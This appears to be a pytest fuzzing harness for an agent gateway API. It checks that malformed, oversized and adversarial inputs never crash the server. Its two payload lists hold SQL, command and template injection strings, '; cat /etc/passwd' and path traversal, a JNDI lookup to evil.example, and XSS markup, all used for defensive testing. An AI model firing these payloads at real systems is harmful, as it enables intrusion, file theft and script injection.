"""Expanded fuzzing harness for the Agent Gateway.

All tests use the in-process FastAPI TestClient (no live server needed).
The key invariant checked by every test: the gateway must never return HTTP 5xx
in response to adversarial, malformed, or oversized inputs.  Valid payloads
may return 200/202; invalid payloads must return 4xx.

Fuzz surfaces covered
---------------------
1. POST /tools/call  ── ToolCall structure fuzzing
   • Missing required fields
   • Wrong types (list, int, None instead of str/dict)
   • Oversized string values (1 MB payload)
   • Unicode extremes (RTL, surrogates, full-width, emoji chains)
   • Injection strings (SQL, SSTI, command, CRLF, null-byte)
   • Path traversal in args values
   • Deeply nested dict / large array args
   • Keys with special characters

2. POST /tab/preview ── DOM snapshot fuzzing
   • Missing / wrong-type html field
   • Script-injection tags (XSS payloads)
   • HTML with null bytes and raw control characters
   • Polyglot / mixed-charset HTML
   • Oversized HTML (500 KB)
   • Deeply nested elements
   • Malformed / unclosed tags
   • SVG / MathML injection vectors
"""
from __future__ import annotations

import string
import sys
import os

import pytest
from fastapi.testclient import TestClient

# ---------------------------------------------------------------------------
# Path setup (mirror conftest.py for standalone execution)
# ---------------------------------------------------------------------------
_GW_DIR = os.path.normpath(os.path.join(os.path.dirname(__file__), '..'))
if _GW_DIR not in sys.path:
    sys.path.insert(0, _GW_DIR)

os.environ.setdefault('AGENT_GATEWAY_ALLOWED_CAPS', 'ALL')

from app import app  # noqa: E402

CLIENT = TestClient(app, raise_server_exceptions=False)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
_VALID_TOOL_CALL = {'tool': 'noop', 'args': {}}

def _call(payload: dict) -> int:
    r = CLIENT.post('/tools/call', json=payload)
    return r.status_code


def _preview(payload: dict) -> int:
    r = CLIENT.post('/tab/preview', json=payload)
    return r.status_code


def _never_5xx(status: int) -> None:
    assert status < 500, f'gateway returned {status} (5xx crash) for fuzz input'


# ---------------------------------------------------------------------------
# 1. ToolCall — structural fuzzing
# ---------------------------------------------------------------------------

class TestToolCallStructural:

    def test_missing_tool_field(self):
        """No `tool` key → 422 Unprocessable Entity from Pydantic."""
        sc = _call({'args': {}})
        assert sc == 422, f'expected 422 got {sc}'

    def test_missing_args_field(self):
        """No `args` key → 422."""
        sc = _call({'tool': 'noop'})
        assert sc == 422, f'expected 422 got {sc}'

    def test_empty_body(self):
        """Completely empty body → 422."""
        sc = _call({})
        assert sc == 422

    def test_args_is_list(self):
        """args as list instead of dict → 422."""
        sc = _call({'tool': 'noop', 'args': [1, 2, 3]})
        assert sc == 422

    def test_args_is_string(self):
        sc = _call({'tool': 'noop', 'args': 'bad'})
        assert sc == 422

    def test_args_is_null(self):
        sc = _call({'tool': 'noop', 'args': None})
        assert sc == 422

    def test_tool_is_int(self):
        sc = _call({'tool': 42, 'args': {}})
        assert sc == 422

    def test_extra_top_level_fields_accepted(self):
        """Unknown extra fields should be ignored, not cause a 500."""
        sc = _call({'tool': 'noop', 'args': {}, 'bogus_field': 'xyz', '__proto__': {}})
        _never_5xx(sc)


# ---------------------------------------------------------------------------
# 2. ToolCall — oversized inputs
# ---------------------------------------------------------------------------

class TestToolCallOversized:

    def test_1mb_string_arg_value(self):
        """1 MB value in a single arg must not crash the server."""
        big = 'A' * 1_000_000
        sc = _call({'tool': 'noop', 'args': {'data': big}})
        _never_5xx(sc)

    def test_many_args_keys(self):
        """10 000 keys in args — must not cause a 500."""
        many = {f'k{i}': i for i in range(10_000)}
        sc = _call({'tool': 'noop', 'args': many})
        _never_5xx(sc)

    def test_deeply_nested_args(self):
        """100-level deep nesting in args."""
        nested: dict = {}
        cur = nested
        for _ in range(100):
            cur['x'] = {}
            cur = cur['x']
        sc = _call({'tool': 'noop', 'args': {'deep': nested}})
        _never_5xx(sc)

    def test_large_array_arg(self):
        """10 000 element list as arg value."""
        sc = _call({'tool': 'noop', 'args': {'items': list(range(10_000))}})
        _never_5xx(sc)

    def test_long_tool_name(self):
        """4096-char tool name — must get 4xx/200, not 5xx."""
        sc = _call({'tool': 'x' * 4096, 'args': {}})
        _never_5xx(sc)


# ---------------------------------------------------------------------------
# 3. ToolCall — injection / adversarial strings
# ---------------------------------------------------------------------------

INJECTION_PAYLOADS = [
    ("sql_injection",       "'; DROP TABLE users; --"),
    ("ssti_jinja",          "{{ 7*7 }}"),
    ("ssti_twig",           "{{_self.env.registerUndefinedFilterCallback('exec')}}"),
    ("command_injection",   "; cat /etc/passwd"),
    ("command_backtick",    "`id`"),
    ("crlf_injection",      "foo\r\nX-Injected: yes"),
    ("path_traversal",      "../../etc/passwd"),
    ("null_byte",           "safe\x00injection"),
    ("format_string",       "%s%s%s%s%s%s%s%s"),
    ("json_escape",         '{"key": "va\\"lue"}'),
    ("unicode_rtl",         "\u202e\u0041\u0062\u0063"),  # RTL override
    ("unicode_surrogates",  "\ud800\udfff"),              # lone surrogates
    ("null_char_sequence",  "\x00\x00\x00"),
    ("xss_basic",           "<script>alert(1)</script>"),
    ("xss_polyglot",        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"),
    ("log4j_style",         "${jndi:ldap://evil.example/a}"),
    ("emoji_flood",         "\U0001f600" * 500),
    ("full_width",          "ｆｕｌｌ　ｗｉｄｔｈ　ｉｎｐｕｔ"),
]


@pytest.mark.parametrize("label,payload_str", INJECTION_PAYLOADS, ids=[p[0] for p in INJECTION_PAYLOADS])
def test_tool_call_injection_args(label: str, payload_str: str):
    """Injection string in args value must not cause a 5xx."""
    sc = _call({'tool': 'noop', 'args': {'value': payload_str}})
    _never_5xx(sc)


@pytest.mark.parametrize("label,payload_str", INJECTION_PAYLOADS, ids=[p[0] for p in INJECTION_PAYLOADS])
def test_tool_call_injection_tool_name(label: str, payload_str: str):
    """Injection string as the tool name must not cause a 5xx."""
    sc = _call({'tool': payload_str, 'args': {}})
    _never_5xx(sc)


@pytest.mark.parametrize("label,payload_str", INJECTION_PAYLOADS, ids=[p[0] for p in INJECTION_PAYLOADS])
def test_tool_call_injection_arg_key(label: str, payload_str: str):
    """Injection string as an args *key* must not cause a 5xx."""
    sc = _call({'tool': 'noop', 'args': {payload_str: 'value'}})
    _never_5xx(sc)


# ---------------------------------------------------------------------------
# 4. /tab/preview — structural fuzzing
# ---------------------------------------------------------------------------

class TestTabPreviewStructural:

    def test_missing_html(self):
        """Body without `html` must return 200 (html defaults to '')."""
        sc = _preview({'url': 'https://example.com'})
        _never_5xx(sc)

    def test_empty_html(self):
        sc = _preview({'html': '', 'url': 'https://example.com'})
        assert sc == 200

    def test_html_is_list(self):
        """html as list — Pydantic-free endpoint; implementation receives it raw."""
        sc = _preview({'html': [1, 2, 3], 'url': 'https://example.com'})
        _never_5xx(sc)

    def test_html_is_int(self):
        sc = _preview({'html': 42, 'url': 'https://example.com'})
        _never_5xx(sc)

    def test_html_is_null(self):
        sc = _preview({'html': None, 'url': 'https://example.com'})
        _never_5xx(sc)

    def test_empty_body(self):
        sc = _preview({})
        _never_5xx(sc)


# ---------------------------------------------------------------------------
# 5. /tab/preview — DOM injection fuzzing
# ---------------------------------------------------------------------------

DOM_PAYLOADS = [
    ("xss_script_tag",      "<script>alert('xss')</script><input name='x' value='y'/>"),
    ("xss_event_handler",   "<img src=x onerror=alert(1)><input name='a'/>"),
    ("svg_xss",             "<svg onload=alert(1)><input name='b'/></svg>"),
    ("iframe_src",          "<iframe src='javascript:alert(1)'></iframe><input name='c'/>"),
    ("form_action",         "<form action='javascript:void(0)'><input name='d'/></form>"),
    ("object_data",         "<object data='data:text/html,<script>alert(1)</script>'></object>"),
    ("meta_refresh",        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"),
    ("comment_injection",   "<!-- --><script>x</script><input name='e'/>"),
    ("unclosed_tags",       "<div><input name='f'><p><span>no closing"),
    ("malformed_attrs",     "<input name='g' value='bad' unknown=>"),
    ("nested_inputs",       "<form><input name='h'><form><input name='i'></form>"),
    ("deep_nesting",        "<div>" * 200 + "<input name='j'/>" + "</div>" * 200),
    ("null_bytes_html",     "hello\x00world<input name='k' value='v'/>"),
    ("control_chars",       "\x01\x02\x03<input name='l'/>"),
    ("data_uri_img",        "<img src='data:text/html,<script>alert(1)</script>'>"),
    ("polyglot_attr",       "<input name='m' value='\"\'><script>alert(1)</script>'>"),
]


@pytest.mark.parametrize("label,dom", DOM_PAYLOADS, ids=[p[0] for p in DOM_PAYLOADS])
def test_tab_preview_dom_injection(label: str, dom: str):
    """Adversarial DOM payloads must not crash the gateway (never 5xx)."""
    sc = _preview({'html': dom, 'url': 'https://fuzz.test'})
    _never_5xx(sc)


def test_tab_preview_500kb_html():
    """500 KB blob of random printable characters in html field."""
    big = (string.printable * 5_000)[:500_000]
    sc = _preview({'html': big, 'url': 'https://fuzz.test'})
    _never_5xx(sc)


def test_tab_preview_many_inputs():
    """HTML with 5000 <input> elements."""
    inputs = ''.join(f'<input name="f{i}" value="v{i}"/>' for i in range(5_000))
    html = f'<html><body>{inputs}</body></html>'
    sc = _preview({'html': html, 'url': 'https://fuzz.test'})
    _never_5xx(sc)


def test_tab_preview_unicode_extremes():
    """HTML with all Unicode planes — must not crash."""
    chars = (
        '\u0000\u0001'              # control
        '\ufffd'                    # replacement character
        '\U0001f600\U0001f4a9'     # emoji
        '\u202e\u200f'             # bidi control
        '\ufeff'                    # BOM
        '\u2028\u2029'             # line/paragraph separators
    )
    html = f'<html><body><p>{chars}</p><input name="x" value="y"/></body></html>'
    sc = _preview({'html': html, 'url': 'https://fuzz.test'})
    _never_5xx(sc)


# ---------------------------------------------------------------------------
# 6. Response shape sanity (non-crash assertions on valid inputs)
# ---------------------------------------------------------------------------

def test_valid_tool_call_returns_structured_response():
    r = CLIENT.post('/tools/call', json=_VALID_TOOL_CALL)
    assert r.status_code < 500
    if r.status_code in (200, 202):
        body = r.json()
        assert isinstance(body, dict)


def test_valid_tab_preview_returns_inputs_key():
    html = '<html><body><input name="username"/><input name="password" type="password"/></body></html>'
    r = CLIENT.post('/tab/preview', json={'html': html, 'url': 'https://test.example'})
    assert r.status_code == 200
    body = r.json()
    assert 'inputs' in body
